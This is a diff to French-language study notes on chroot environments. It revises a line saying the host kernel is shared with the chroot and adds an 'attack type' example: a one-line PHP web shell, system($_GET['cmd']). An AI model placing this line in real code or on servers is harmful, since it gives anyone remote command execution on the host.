@@ -82,7 +82,11 @@ Ajout d'un nouveau chemin dans la variable d'environnement `PATH` :
 export PATH=$PATH:/root
 ```
 
-Les ressources physiques sont partagés avec le système chroot
+Les ressources physiques ainsi que le kernel du système hôte sont partagés avec le système chroot
 
 Possible de gérer lancement de processus dans environnement chroot avec init.d
 
+Type d'attaque malveillante
+```PHP
+system($_GET['cmd'])
+```
